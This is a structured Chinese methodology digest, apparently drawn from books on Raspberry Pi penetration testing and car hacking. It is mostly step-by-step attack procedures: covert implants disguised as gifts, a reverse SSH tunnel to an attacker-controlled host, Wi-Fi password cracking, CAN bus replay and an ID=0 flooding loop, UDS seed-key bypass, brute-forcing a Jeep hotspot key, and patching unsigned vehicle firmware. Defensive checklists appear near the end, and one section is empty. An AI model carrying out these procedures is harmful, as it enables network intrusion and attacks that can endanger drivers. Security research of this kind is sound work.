## I — 方法论骨架 (Interpretation)

**用树莓派作"摆渡舱"把内网攻击转为外部可达** — 严密内网通常只允许出站、禁止入站。把一台信用卡大小、可由社工/维修/礼物方式送入物理边界内的树莓派当作"渡舱"：它在内网获得出站链路（有线或 3G/4G），再向攻击者控制的外网主机建立反向隧道，把内网 SSH 端口反向暴露到外网。这样"外网无法直达内网"的假设被攻破，攻击者通过外网主机 hop 一步即入内网。

**把树莓派伪装成礼物/日常物品隐秘植入目标物理边界** — 树莓派体积仅信用卡大小、5V 供电、无风扇静音、可由充电宝续航，这些硬件特性使其可被装入礼品盒、装饰物、维修备件、插座等日常物品中而不被发现。"伪装成礼物"利用目标人员会接受/摆放礼物的社交信任；"放到不宜察觉的地方"利用物理死角（桌下、吊顶、设备背面）。一旦设备进入并保持上电，攻击者即可在外网通过反向隧道长期驻留，无需人员靠近。

**把扫描到的 ESSID/BSSID 当作云端密钥库的 key，构建 Wi-Fi 密码共享云** — 单台树莓派能扫到的 AP 范围有限，但多台分散部署的树莓派可以共享一个云端键值库。以 `ESSID:BSSID` 复合作为 key（BSSID 比 ESSID 更难伪造，组合后碰撞更低），value 是该 AP 已知/破解过的密码列表。新树莓派扫描到一个 AP 时先查云端，命中则直接用；未命中则本地尝试破解（reaver/字典），破解成功后把密码回写云端。多次部署后云端形成"已知 AP 密码库"，新接入的树莓派越来越快。

**按"间接物理 / 短距无线 / 远距无线"三层分类汽车攻击面** — 评估一辆车的攻击面不能只看"有哪些入口"，必须把每个入口按"攻击者需要克服的物理条件"分层：间接物理访问（OBD-II、多媒体光盘、USB、OBD 盒子等需通过中介设备/媒介接触）、短距离无线（蓝牙、Wi-Fi、RFID、TPMS、PKE、DSRC，攻击者需在车附近）、远距无线（GPS、卫星、蜂窝、远程协助系统，攻击者可在任意地点发起）。越靠后层级威胁越大（任意地点发起），但技术门槛也越高（需找到远程可利用漏洞）。

**利用 OBD-II 接口直访 CAN 总线控制汽车物理功能** — OBD-II 接口的 6/14 引脚直接连到汽车的 CAN 总线（ISO 15765 CAN 协议）。这意味着任何插上 OBD 设备的人都能监听并注入 CAN 帧。汽车维修功能本身就允许通过 OBD 主动控制执行器（喷油、点火等），攻击者无需破解加密，只需用诊断仪发诊断指令即可触发物理动作。OBD 盒子（远程诊断硬件）还把这条直访路径转成蓝牙/Wi-Fi/蜂窝可达，进一步放大攻击面。

**用覆盖模式 + ID 关联逆向 CAN 控制消息** — CAN 总线广播式、无源/目的地址、仅有消息 ID。逆向关键在于"动作—ID—数据变化"三者的关联：在车上做某个动作（转方向盘、踩刹车、按按钮），观察哪些 ID 的哪几个字节在变化，从而定位承载该动作的 CAN 帧。覆盖模式（实时刷新同一行）让肉眼可见变化；进一步可对承载多个信号的同一帧做字节级差分。最终把"动作→ID→字节→位"映射建为 .dbc/.dbf 数据库，即可自动解析任意 CAN 流量。

**用 ID=0 高优先级帧对 CAN 总线做拒绝服务** — CAN 总线仲裁规则是"ID 最小的消息优先发送且不会有数据丢失"，且显态（0）会重写隐态（1）。ID=0 的消息在仲裁中总是赢家。一旦攻击者拿到总线访问权并循环发送 ID=0 帧，所有其他 ECU 的消息都仲裁失败、无法发送，导致刹车/转向/仪表等关键通信全部阻塞。这是 CAN 协议设计本身的固有缺陷——它假设总线上所有节点可信，没有对单节点发送频率或优先级做限制。

**用 UDS 安全访问的种子-密钥协议实施 ECU 认证后再控制** — UDS（ISO 14229）规定敏感诊断行为（输入输出控制、固件下载、程序控制等）前必须先通过"安全访问"（服务 ID 0x27）。流程是请求方发 `27 01` 索要种子，ECU 返回随机种子；请求方用与 ECU 共享的密码函数和密钥算出密钥，发 `27 02 <key>` 应答；ECU 校验通过后才允许后续敏感服务。密钥本身从不上总线，看似安全，但若密钥函数可逆向（固件提取后分析）或种子空间过小，则整个机制退化为"知道函数+密钥即可绕过"。

**用 Wi-Fi 密码基于时间种子的生成漏洞爆破 Jeep 车机热点** — Jeep Uconnect 的 Wi-Fi 服务二进制 `WifiSvc` 中 `WiFi.E:generateRandomAsciiKey0` 用 `srand(time(NULL))` 作为随机种子，再 `rand() % 62` 选字母数字。由于 `time(NULL)` 是秒级时间戳，密码空间被压缩到"生成时刻秒数 × 每秒单密码"。攻击者按汽车生产日期估算首启时间窗口（一个月），生成该窗口内所有可能密码离线爆破即可。更进一步，`clock.lua` 在车机未同步时间时把时间硬编码为 2013-01-01 00:00:00 GMT，`WifiSvc` 在第 32 秒生成密码，使密码空间坍缩到十几个候选。

**通过被破解的飞蜂窝把 Jeep 蜂窝攻击距离从单基站扩到全国** — Jeep Uconnect 蜂窝网接口绑定 Sprint 网络，D-Bus 端口 6667 绑定在所有接口上（含 ppp0）。最初假设 Sprint 会拦截设备间通信，故先用破解的 Sprint Airave 飞蜂窝让目标 Jeep 接入攻击者的小基站，将攻击距离从 Wi-Fi 32 米扩到飞蜂窝覆盖（数百米）。但实测发现 Sprint 网络并不拦截设备间通信，任意 Sprint 网络内的设备可直接 telnet 全国任意 Jeep 的 21.x.x.x/25.x.x.x:6667。这一发现把攻击距离从"接近车辆"一次性扩到"全国任意位置"。

**用 iocupdate + 未签名固件升级把 OMAP 代码执行升级为 CAN 直控** — Jeep Uconnect 的 OMAP（应用处理器）拿到 root 后并不能直接发 CAN 帧——CAN 通信由另一颗 Renesas V850ES/FJ3 芯片（书中称 IOC）负责。OMAP 与 V850 之间有 IPC 通道，且 OMAP 可通过 `iocupdate` 工具向 V850 推送固件。关键漏洞：V850 固件升级不做数字签名校验，OMAP 可以推任意篡改后的固件给 V850。攻击者逆向 V850 固件找到 `can_transmit_msg` 等函数（用 IDA Pro + V850 处理器模块），在固件中插入能接收 OMAP 命令并调用 `can_transmit_msg` 发任意 CAN 帧的代码，烧回 V850，从而把"OMAP root"升级为"CAN 总线直控"。

**用 VIN 标志重捕贝叶斯估计全网有漏洞车辆总数** — 当不能扫遍所有目标时，用标志重捕法（capture-mark-recapture，原用于野生动物种群估计）从两次扫描的"重复率"反推总量。设第一次扫到 N1 台，第二次扫到 N2 台，两次重合 M 台，则总量 N ≈ (N1×N2)/M。书中实测 N1=N2=2694，M=19，得 381,980 ± 89,393（约 29.2 万–47.1 万）。这种方法适用于任何"无法全量枚举但可重复随机抽样"的漏洞规模估计，如扫描 Shodan、Censys 上的特定端口指纹。

**用"五星汽车网络安全计划"五项核查防御设计缺陷** — 这是一份面向车厂的防御核查清单，按五项逐条检查：①设计阶段是否采用标准、控供应链、减攻击面、做攻击者视角独立测试；②是否与第三方安全公司/漏洞平台/悬赏计划合作；③是否部署黑匣子类数据记录装置并保护车主隐私；④是否有可靠安全的软件升级通道与漏洞快速响应机制；⑤关键模块是否做物理隔离（而非逻辑隔离）+ 系统完整性检查 + 抗破坏。其中第 5 项的关键判据是"物理隔离 vs 逻辑隔离"——作者明确警告逻辑隔离总能被绕过（Jeep 案例中 OMAP 与 V850 之间是 SPI 逻辑隔离，但通过固件升级被绕过）。

**在 OTA 升级链路里必须验证签名 + 信任链 + 完整性** — OTA 升级是车厂修补漏洞的主要通道，同时也是攻击者植入恶意固件的潜在入口。安全的 OTA 必须做到：①固件签名——车厂用私钥签名固件，车端用公钥校验，拒绝未签名或签名错误的固件；②证书链——车端信任的根 CA 由车厂自签（如特斯拉的 Root CA → Policy CA → Issuing CA → 服务器/客户端证书），任一中间证书被吊销或越权签发的证书应被拒；③完整性——除签名外还应做哈希校验防止传输损坏；④回滚保护——防止攻击者刷旧版本固件利用已修复漏洞。Jeep V850 未做签名校验是典型反例——攻击者拿到 OMAP root 后可直接刷篡改固件到 V850。

**用 ECU 闭环控制原理判断攻击后果严重性** — 现代 ECU 是闭环控制系统：传感器采集→ECU 计算→执行器动作→传感器再采集。线控（X-By-Wire）把转向/加速/刹车等原本由驾驶员机械控制的功能交给 ECU 控制，方向盘退化为传感器。这意味着：①攻击者只要能向 CAN 总线注入伪造的"传感器读数"或"控制指令"，闭环就会被攻击者挟持；②线控功能一旦被控制，驾驶员的机械干预能力被削弱甚至消失（Override 不可用）；③越深的线控化=越大的攻击后果。判断一个 CAN 帧注入的严重性时，看它是否参与了线控闭环——参与则可能直接致伤亡，不参与（如只控空调）则影响有限。

## A1 — 应用示例 (Application Example)

### 示例 1: 用树莓派作"摆渡舱"把内网攻击转为外部可达
- **类型与来源**: 【framework】《基于树莓派的渗透测试_ocr.txt》· 第 19–23 页"摆渡攻击"
- **问题/输入**: 一台外网可达的跳板主机（公网 IP + sshd）；树莓派 + Micro SD + 供电 + 3G/4G 上网卡（见 CU-OCR1-03）；目标内网允许出站 SSH 或允许 3G 信号
- **方法论的使用**: 严密内网通常只允许出站、禁止入站。把一台信用卡大小、可由社工/维修/礼物方式送入物理边界内的树莓派当作"渡舱"：它在内网获得出站链路（有线或 3G/4G），再向攻击者控制的外网主机建立反向隧道，把内网 SSH 端口反向暴露到外网。这样"外网无法直达内网"的假设被攻破，攻击者通过外网主机 hop 一步即入内网。
- **结果**: 【亲历】作者用 pwnpi 系统的树莓派 + 91duofanli.com 外网主机，演示 `ssh -NfR 10000:localhost:22 mx@www.91duofanli.com -p22` 反向暴露内网 sshd，外网主机再 `ssh 127.0.0.1 -p10000` 进入树莓派

### 示例 2: 把树莓派伪装成礼物/日常物品隐秘植入目标物理边界
- **类型与来源**: 【principle】《基于树莓派的渗透测试_ocr.txt》· 第 29 页与第 31 页"隐秘安装树莓派——伪装成礼物""隐秘安装树莓派——放到不宜察觉的地方"
- **问题/输入**: 目标接受外部物品的渠道（礼品、维修、物流）；树莓派 + 充电宝 + 3G/4G 上网卡 + 伪装载体；事先对目标环境的勘测
- **方法论的使用**: 树莓派体积仅信用卡大小、5V 供电、无风扇静音、可由充电宝续航，这些硬件特性使其可被装入礼品盒、装饰物、维修备件、插座等日常物品中而不被发现。"伪装成礼物"利用目标人员会接受/摆放礼物的社交信任；"放到不宜察觉的地方"利用物理死角（桌下、吊顶、设备背面）。一旦设备进入并保持上电，攻击者即可在外网通过反向隧道长期驻留，无需人员靠近。
- **结果**: 【亲历】作者第 29 页与第 31 页专门给出两张截图分别展示"伪装成礼物"与"放到不宜察觉的地方"两种部署形态

### 示例 3: 把扫描到的 ESSID/BSSID 当作云端密钥库的 key，构建 Wi-Fi 密码共享云
- **类型与来源**: 【framework】《基于树莓派的渗透测试_ocr.txt》· 第 33 页"将ESSID:BSSID做为key"
- **问题/输入**: 多台分布部署的树莓派（或多次重定位的单台）；可访问的云端键值服务；`iwlist wlan0 scanning` 输出可解析
- **方法论的使用**: 单台树莓派能扫到的 AP 范围有限，但多台分散部署的树莓派可以共享一个云端键值库。以 `ESSID:BSSID` 复合作为 key（BSSID 比 ESSID 更难伪造，组合后碰撞更低），value 是该 AP 已知/破解过的密码列表。新树莓派扫描到一个 AP 时先查云端，命中则直接用；未命中则本地尝试破解（reaver/字典），破解成功后把密码回写云端。多次部署后云端形成"已知 AP 密码库"，新接入的树莓派越来越快。
- **结果**: 【转述】作者第 33 页用流程图描述了这一云端协同机制，未给出云端具体实现代码

### 示例 4: 按"间接物理 / 短距无线 / 远距无线"三层分类汽车攻击面
- **类型与来源**: 【principle】《智能汽车安全攻防大揭秘_ocr.txt》· 第 2.3 节"汽车的攻击面"（约第 562–808 行）
- **问题/输入**: 目标车辆型号、年份、配置清单（用于枚举接口）；攻击者能力假设（资金、硬件、同型号车获取能力）
- **方法论的使用**: 评估一辆车的攻击面不能只看"有哪些入口"，必须把每个入口按"攻击者需要克服的物理条件"分层：间接物理访问（OBD-II、多媒体光盘、USB、OBD 盒子等需通过中介设备/媒介接触）、短距离无线（蓝牙、Wi-Fi、RFID、TPMS、PKE、DSRC，攻击者需在车附近）、远距无线（GPS、卫星、蜂窝、远程协助系统，攻击者可在任意地点发起）。越靠后层级威胁越大（任意地点发起），但技术门槛也越高（需找到远程可利用漏洞）。
- **结果**: 【转述】作者用此框架分析了 Jeep 大切诺基的攻击向量并最终选择蜂窝网作为远程入口，详见第 7 章

### 示例 5: 利用 OBD-II 接口直访 CAN 总线控制汽车物理功能
- **类型与来源**: 【principle】《智能汽车安全攻防大揭秘_ocr.txt》· 第 2.3.1 与 5.3/5.5 节
- **问题/输入**: 物理接触目标车（间接物理层）；OBD 诊断硬件；BusMaster/VehicleSpy 等分析软件；目标车采用 ISO 15765 CAN 协议（多数 2008 后车型）
- **方法论的使用**: OBD-II 接口的 6/14 引脚直接连到汽车的 CAN 总线（ISO 15765 CAN 协议）。这意味着任何插上 OBD 设备的人都能监听并注入 CAN 帧。汽车维修功能本身就允许通过 OBD 主动控制执行器（喷油、点火等），攻击者无需破解加密，只需用诊断仪发诊断指令即可触发物理动作。OBD 盒子（远程诊断硬件）还把这条直访路径转成蓝牙/Wi-Fi/蜂窝可达，进一步放大攻击面。
- **结果**: 【转述】作者第 5.5 节明确指出"通过 OBD 可以对 ECU 的固件进行篡改（如加入恶意代码）"，并把 OBD 列为间接物理攻击面首要入口

### 示例 6: 用覆盖模式 + ID 关联逆向 CAN 控制消息
- **类型与来源**: 【framework】《智能汽车安全攻防大揭秘_ocr.txt》· 第 6.1.8 节"CAN 分析工具及逆向分析方法"（约第 2677–2960 行）
- **问题/输入**: 物理接触目标车；CAN 接口硬件（Kvaser/ValueCAN/SocketCAN 兼容 USB 设备）；分析软件（BusMaster 免费版可用）；最好有一辆可重复实验的同型号车
- **方法论的使用**: CAN 总线广播式、无源/目的地址、仅有消息 ID。逆向关键在于"动作—ID—数据变化"三者的关联：在车上做某个动作（转方向盘、踩刹车、按按钮），观察哪些 ID 的哪几个字节在变化，从而定位承载该动作的 CAN 帧。覆盖模式（实时刷新同一行）让肉眼可见变化；进一步可对承载多个信号的同一帧做字节级差分。最终把"动作→ID→字节→位"映射建为 .dbc/.dbf 数据库，即可自动解析任意 CAN 流量。
- **结果**: 【亲历】作者用 BusMaster 逆向某辆汽车方向盘数据，确认 ID 0x11F 承载转向角与转向速度；第 6-20 至 6-23 图展示完整流程

### 示例 7: 用 ID=0 高优先级帧对 CAN 总线做拒绝服务
- **类型与来源**: 【principle】《智能汽车安全攻防大揭秘_ocr.txt》· 第 6.1.3 节"CAN 协议的特点"
- **问题/输入**: 已有 CAN 总线访问权；攻击者不在乎被发现（这是显式 DoS）
- **方法论的使用**: CAN 总线仲裁规则是"ID 最小的消息优先发送且不会有数据丢失"，且显态（0）会重写隐态（1）。ID=0 的消息在仲裁中总是赢家。一旦攻击者拿到总线访问权并循环发送 ID=0 帧，所有其他 ECU 的消息都仲裁失败、无法发送，导致刹车/转向/仪表等关键通信全部阻塞。这是 CAN 协议设计本身的固有缺陷——它假设总线上所有节点可信，没有对单节点发送频率或优先级做限制。
- **结果**: 【转述】作者第 6.1.3 节作为 CAN 协议特点的副作用明确指出此攻击向量

### 示例 8: 用 UDS 安全访问的种子-密钥协议实施 ECU 认证后再控制
- **类型与来源**: 【framework】《智能汽车安全攻防大揭秘_ocr.txt》· 第 6.1.7 节"统一诊断服务"
- **问题/输入**: OBD/CAN 接入；ECU 固件或同型号 ECU 用于逆向密钥函数（书中给出请求/响应示例但未给出密钥函数）；目标 ECU 实现 UDS 而非仅 KWP2000
- **方法论的使用**: UDS（ISO 14229）规定敏感诊断行为（输入输出控制、固件下载、程序控制等）前必须先通过"安全访问"（服务 ID 0x27）。流程是请求方发 `27 01` 索要种子，ECU 返回随机种子；请求方用与 ECU 共享的密码函数和密钥算出密钥，发 `27 02 <key>` 应答；ECU 校验通过后才允许后续敏感服务。密钥本身从不上总线，看似安全，但若密钥函数可逆向（固件提取后分析）或种子空间过小，则整个机制退化为"知道函数+密钥即可绕过"。
- **结果**: 【转述】作者以 Charlie Miller 与 Chris Valasek 文章中的真实 UDS 报文作为示例，展示从 `27 01` 到 `27 02 DO B6 F1` 的完整认证流程

## E — 执行步骤 (Execution)

### 用树莓派作"摆渡舱"把内网攻击转为外部可达

1. 锁定目标资产位置与可达性 → 判据：明确目标网络是否有出站过滤、是否允许 3G 信号
  2. 以社工/维修/伪装（见 CU-OCR1-04）将树莓派送入内网物理范围 → 判据：设备获得内网 IP 或可上电
  3. 攻击路由器/AP/服务器获取内网立足点 → 判据：树莓派可 ping 通内网多个网段
  4. 建立反向隧道把内网 SSH 端口暴露到外网主机（见 CU-OCR1-02）→ 判据：外网主机可 `ssh 127.0.0.1 -p10000` 登录进内网
  5. 以内网机器作为跳板漫游内网 → 判据：可在内网横向访问其他主机

### 把树莓派伪装成礼物/日常物品隐秘植入目标物理边界

1. 评估目标物理环境：人员密度、电源插座、监控覆盖、物品摆放习惯 → 判据：找到至少一个可长期供电且不被注意的位置
  2. 选定伪装载体：礼品盒 / 装饰摆件 / 多功能插座 / 假装维修遗留的备件 → 判据：载体与目标环境风格一致
  3. 在载体内部固定树莓派 + 充电宝 + 3G/4G 上网卡，留出天线/散热 → 判据：上电后 `ifconfig` 在外网可见
  4. 通过社工（赠送、伪装快递、维修人员身份）把载体送入目标区域 → 判据：载体被目标人员主动摆放而非丢弃
  5. 在外网主机验证反向隧道存活 → 判据：autossh 通道持续可达

### 把扫描到的 ESSID/BSSID 当作云端密钥库的 key，构建 Wi-Fi 密码共享云

1. 部署云端键值服务（书中未指定具体实现，可选 Redis/HTTP API）→ 判据：树莓派可 curl 读写
  2. 树莓派扫描附近 AP：`iwlist wlan0 scanning` → 判据：得到 ESSID、BSSID、Encryption、Channel 等字段
  3. 对每个 AP 拼接 key=`<ESSID>:<BSSID>` 查询云端 → 判据：返回 value（密码列表）或"不存在"
  4. key 不存在则添加空 value，本地尝试破解（见 CU-OCR1-05），破解成功后回写 → 判据：云端 key 的 value 含新密码
  5. key 存在则按 value 中的密码依次尝试连接（见 CU-OCR1-06）→ 判据：树莓派成功 DHCP

### 按"间接物理 / 短距无线 / 远距无线"三层分类汽车攻击面

1. 列出目标车辆所有对外接口：OBD-II、USB、SD、CD、蓝牙、Wi-Fi、433MHz/315MHz/125kHz、TPMS、GPS、蜂窝、卫星广播、远程协助系统 → 判据：清单覆盖三个层级
  2. 对每个接口标注技术能力假设：攻击者能否获得同型号车做研究、能否买到对应收发硬件 → 判据：每个接口有 Y/N
  3. 对每个接口标注操作限制：是否需要物理进入、是否需要在车附近、是否可任意距离发起 → 判据：每个接口归入三层之一
  4. 按"远距 > 短距 > 间接物理"排序优先级 → 判据：得到一份按威胁递减的攻击向量清单
  5. 对最高优先级向量优先做漏洞挖掘与利用链构造 → 判据：选定下一阶段研究对象

### 利用 OBD-II 接口直访 CAN 总线控制汽车物理功能

1. 确认目标车 OBD-II 接口位置（驾驶员膝盖前方/引擎仓）与引脚定义 → 判据：见到 16 针标准接口且 6/14 脚有连线
  2. 选定诊断硬件：ELM327 系列（最便宜）/ Kvaser Leaf Light（专业）/ ValueCAN → 判据：硬件被驱动识别
  3. 用 BusMaster 或 VehicleSpy 监听 CAN 流量 → 判据：消息窗口出现 ID + 8 字节数据
  4. 用 UDS 服务（见 CU-OCR1-12）做输入输出控制或程序控制 → 判据：触发目标 ECU 物理动作
  5. 通过 OBD 盒子的蓝牙/Wi-Fi 把这条路径远程化（若车主已配对 OBD 盒子）→ 判据：从车外可发 CAN 帧

### 用覆盖模式 + ID 关联逆向 CAN 控制消息

1. 物理接入 CAN：从 OBD 接口 6/14 脚引出双绞线，或直接剥线束找绞在一起的 CAN-H/CAN-L → 判据：示波器或 `cansniffer` 看到差分信号
  2. 测量电阻（末端 60Ω）+ 电压（静默 2.5V）确认 CAN → 判据：符合 CAN 物理特性
  3. 启动 BusMaster/SocketCAN/cansniffer，开启覆盖模式（BusMaster "Real Time Data Flow"+"overwrite"）→ 判据：界面按行刷新而非追加
  4. 在车上做动作（转方向盘、踩刹车、开关门）→ 判据：识别出 ID 与变化的字节
  5. 把每个动作对应 ID+字节+位+系数录入 CAN 数据库（.dbc/.dbf）→ 判据：加载该库后实时流自动显示语义化信号（转向角、车速等）
  6. 重放：用 `cansend` 或 BusMaster 重放记录的帧 → 判据：目标 ECU 触发对应物理动作

### 用 ID=0 高优先级帧对 CAN 总线做拒绝服务

1. 取得 CAN 总线访问权（见 CU-OCR1-09 或 CU-OCR1-12）→ 判据：可发送任意 ID 帧
  2. 构造 ID=0 的数据帧（标准 11 位 ID 全 0）→ 判据：`cansend can0 000#0102030405060708` 发出
  3. 以最高速率循环发送：`while true; do cansend can0 000#...; done` 或 SocketCAN RAW socket `send` 循环 → 判据：`candump` 显示总线几乎全是 0x000 帧
  4. 观察 ECU 反应：仪表报警、关键功能失效 → 判据：目标功能不可用

### 用 UDS 安全访问的种子-密钥协议实施 ECU 认证后再控制

1. 建立诊断会话：发送 `10 03`（扩展诊断会话）或 `10 85`（特定子模式）→ 判据：ECU 响应 `50 03 ...`
  2. 请求种子：发 `27 01` → 判据：ECU 响应 `67 01 <seed_3bytes>`
  3. 用本地实现的密钥函数（从 ECU 固件逆向得到）算 key：`key = f(seed, secret_key)` → 判据：可重复生成与 ECU 一致的 key
  4. 发送密钥：`27 02 <key>` → 判据：ECU 响应 `67 02`（成功）而非 `7F 27 ..`（错误）
  5. 调用敏感服务：输入输出控制（`2F`）、请求下载（`34`）、传输数据（`36`）、程序控制（`31`）→ 判据：ECU 执行目标动作

### 用 Wi-Fi 密码基于时间种子的生成漏洞爆破 Jeep 车机热点

1. 逆向 `WifiSvc` 二进制（OMAP 芯片上）找到 `generateRandomAsciiKey0` → 判据：识别 `srand(time(NULL))` 调用
  2. 用生产日期估算首启月份，生成 1500 万候选密码（每秒 1 个，30 天 × 86400 秒）→ 判据：得到密码字典文件
  3. 离线爆破：以每秒 133,000 次速度尝试（2 分钟覆盖一个月）→ 判据：匹配出 Wi-Fi 密码
  4. 加速路径：若目标车首启时无 GPS/蜂窝时间同步，密码生成时刻固定为 2013-01-01 00:00:32 GMT 附近，仅需尝试十几个候选 → 判据：秒级破解
  5. 用破解得到的密码接入 Jeep Wi-Fi 热点（默认网关 192.168.5.1）→ 判据：可 telnet 192.168.5.1 6667

### 通过被破解的飞蜂窝把 Jeep 蜂窝攻击距离从单基站扩到全国

### 用 iocupdate + 未签名固件升级把 OMAP 代码执行升级为 CAN 直控

1. 取得 OMAP root shell（见 CU-OCR1-14）→ 判据：在 OMAP 上有 root 权限
  2. 提取 IOC 应用固件：从 ISO 包 `usr/share/V850/cmcioc.bin`（458752 字节）→ 判据：文件可被 IDA Pro 加载
  3. 用 IDA Pro + V850 处理器模块逆向固件：定位 ROM 起点（0x10000）、GP 寄存器值（0x3FFF10C）、PPA 基址（0x3FEC000）→ 判据：IDB 中所有代码段蓝色，函数交叉引用完整
  4. 用 V850 数据手册在 IDB 中为 PPA 区段的 CAN 模块寄存器与消息缓冲区命名 → 判据：找到 `can_transmit_msg` 等函数
  5. 修改固件：插入一段监听 OMAP IPC 命令并调用 `can_transmit_msg` 发任意 ID+8 字节数据的代码 → 判据：patch 后的二进制可烧写

### 用 VIN 标志重捕贝叶斯估计全网有漏洞车辆总数

1. 在 Sprint 网络内对 21.0.0.0/8 与 25.0.0.0/8 全段扫 6667 端口 → 判据：得到第一轮 IP+VIN 列表 N1
  2. 间隔一段时间后再扫一次 → 判据：得到第二轮列表 N2
  3. 用 VIN 编号去重比对两轮 → 判据：得到重合数 M（注意 IP 每次重启会变，必须用 VIN 而非 IP 比对）

  5. 与厂商召回数对比验证 → 判据：估计值落在召回量级范围内

### 用"五星汽车网络安全计划"五项核查防御设计缺陷

1. 设计安全核查：列清单——是否采用 NIST/ISO 标准？供应链是否审查？攻击面是否最小化？是否做过独立红队测试？→ 判据：每条 Y/N
  2. 三方合作核查：是否有签约安全公司？是否有 bug bounty？是否对接 CVE/CNVD？→ 判据：Y/N
  3. 证据采集核查：车上是否有黑匣子？记录哪些数据？隐私是否加密？→ 判据：Y/N
  4. 升级机制核查：升级通道是否签名？是否能远程推送？是否可快速响应？→ 判据：见 CU-OCR1-20
  5. 隔离机制核查：关键 ECU 与次要 ECU 是物理隔离还是逻辑隔离？若是逻辑隔离，被绕过的路径是什么？是否有完整性检查？→ 判据：物理隔离 Y / 逻辑隔离需列已知绕过路径

### 在 OTA 升级链路里必须验证签名 + 信任链 + 完整性

1. 设计阶段：为所有 ECU 固件建立签名机制（RSA 或 ECDSA），私钥离线保管 → 判据：未签名固件在车端被拒
  2. 部署证书链：在车端预置车厂 Root CA 公钥，固件签名证书由 Issuing CA 签发 → 判据：证书链可验证到 Root CA
  3. 升级时校验：先验签再验证书链再写入 Flash → 判据：篡改固件（如 Jeep patched cmcioc.bin）被拒
  4. 防回滚：在固件头中加入版本号，车端记录已升级过的最高版本，拒绝低于此版本的固件 → 判据：旧版本固件无法刷入
  5. 升级失败可恢复：保留上一版本固件，升级失败自动回滚 → 判据：升级失败后车辆仍可启动

### 用 ECU 闭环控制原理判断攻击后果严重性

1. 拿到目标车的功能清单，标注每个功能是否依赖线控（转向/油门/刹车/驻车）→ 判据：线控功能列表清晰
  2. 对每个线控功能定位承载 ECU（如 ACC 自适应巡航、PAM 泊车辅助、EPS 电子助力转向）→ 判据：ECU 物理位置与 CAN 总线归属明确
  3. 对每个 ECU 逆向出参与闭环的关键 CAN 帧（见 CU-OCR1-10）→ 判据：识别出"传感器读数"帧与"控制指令"帧
  4. 评估注入后果：是否能触发非驾驶员意图的执行器动作？驾驶员能否机械 Override？→ 判据：按"可致伤亡 / 可致车辆失控 / 仅干扰"分级
  5. 优先防御：对参与线控闭环的 ECU 加固（隔离总线、签名指令、限速）→ 判据：线控相关 ECU 防御优先级最高

## B — 失效与边界 (Boundary)

- **用树莓派作"摆渡舱"把内网攻击转为外部可达**：书中原文给出的失败信号：`Warning: remote port forwarding failed for listen port 10000`——这意味着外网主机 10000 端口已被占用或之前隧道未释放，反向转发未成功，需先清理再重连
- **把树莓派伪装成礼物/日常物品隐秘植入目标物理边界**：充电宝续航有限，需周期性补给或找到常驻电源；监控可能记录放置过程；目标人员可能移动或丢弃载体；天线被金属外壳遮挡会失去蜂窝信号
- **把扫描到的 ESSID/BSSID 当作云端密钥库的 key，构建 Wi-Fi 密码共享云**：ESSID 改名（如 CMCC 的多个分支）会导致 key 漂移，建议以 BSSID 为主键；WPA3 不再支持离线字典，reaver 也对 WPS-lock 的 AP 无效；云端服务暴露会泄露所有已破解密码，需做访问控制（书中未讨论）
- **按"间接物理 / 短距无线 / 远距无线"三层分类汽车攻击面**：书中明确警告"我们假设攻击者不能暴力破解长密钥"——这意味着若某接口采用正确配置的加密，不能假设可破；作者提醒"OBD 盒子通常利用蜂窝网与服务器通信，或者利用蓝牙或 Wi-Fi 与手机通信"——间接物理接口常被无线 OBD 盒子转成无线攻击面，分类时要跟踪完整链路而非只看接口本身
- **利用 OBD-II 接口直访 CAN 总线控制汽车物理功能**：某些车型 OBD 接口只连接到诊断 CAN 而非驱动 CAN，需要通过网关才能跨网段发指令；书中警告"通过 OBD 攻击需要物理进入汽车"曾被业界质疑，因此单独 OBD 攻击说服力弱，常需配合无线入口形成完整链路（见 Jeep 案例）
- **用覆盖模式 + ID 关联逆向 CAN 控制消息**：作者提醒"CAN 数据库是描述 CAN 消息含义的数据，一般是一个文本文件，属于厂家的保密信息"——数据库不公开，必须自己逆向；不同年款/配置的同型号车 CAN ID 可能不同；CAN 总线高速流量下覆盖模式难以肉眼跟踪，需配合触发条件；某些安全相关 ECU 会校验 Roll-over Counter 或 CRC，单帧重放无效
- **用 ID=0 高优先级帧对 CAN 总线做拒绝服务**：现代部分车型在网关处对 ID=0 做过滤；某些 ECU 有看门狗会进入 limp mode；这种 DoS 是显式攻击，不适用于隐蔽持久化；作者未讨论防御侧应对（如总线监控器）
- **用 UDS 安全访问的种子-密钥协议实施 ECU 认证后再控制**：作者警告"用这种方式，实际的密钥不会在 CAN 网络中传输, 但反过来进行非重复的复杂响应就值得商榷了"——若密钥函数设计不当（如线性变换、种子过短），逆向后可被秒破；不同 ECU 厂商实现不同，密钥函数需逐型号逆向；某些 ECU 安全访问有失败次数限制，多次错误后锁定
- **用 Wi-Fi 密码基于时间种子的生成漏洞爆破 Jeep 车机热点**：若车主已同步过时间，密码生成时间会变为真实首启时刻，需逐秒爆破覆盖该时刻前后；作者强调"只有当车主启用了 Wi-Fi 后这个漏洞才能被利用"——未开通 Wi-Fi 服务的车不可用此入口；后续车型若改用强随机源（如 /dev/urandom）此漏洞失效
- **通过被破解的飞蜂窝把 Jeep 蜂窝攻击距离从单基站扩到全国**：作者明确"发起连接的主机必须要在 Sprint 网络上……而不是在互联网中任意一台主机上"——公网任意主机无法直达；Sprint 后续可能修补设备间直连策略；此漏洞只对 Sprint 网络的 Uconnect 有效，其他运营商车机需要类似入口
- **用 iocupdate + 未签名固件升级把 OMAP 代码执行升级为 CAN 直控**：作者承认"他们用了几周才成功地通过修改固件实现通过无线接口任意发送 CAN 消息"——逆向工程量大；初期他们误把 ROM 数据当代码导致找不到 PPA 交叉引用，需仔细检查代码/数据边界；V850 在引导程序模式下才能更新应用固件，需先发命令切换模式；克莱斯勒召回后通过签名校验修补了此路径
- **用 VIN 标志重捕贝叶斯估计全网有漏洞车辆总数**：作者承认"他们的应用环境和这个数学模型的要求并不完全一致，但是非常接近"——主要偏差源是车辆不是均匀随机出现在扫描样本中（车主作息、地理位置都会偏置）；IP 重启变化使"重合"必须用 VIN 而非 IP；克莱斯勒最后召回 140 万辆，远超估计的 47 万上限，说明估计偏低
- **用"五星汽车网络安全计划"五项核查防御设计缺陷**：作者明确指出"逻辑隔离总能有方法绕过"——若车厂以"已做逻辑隔离"自满，则按此清单第 5 项应判为不合格；清单本身是建议而非强制标准，无约束力；缺少量化判据（如"攻击面最小化"无明确阈值）
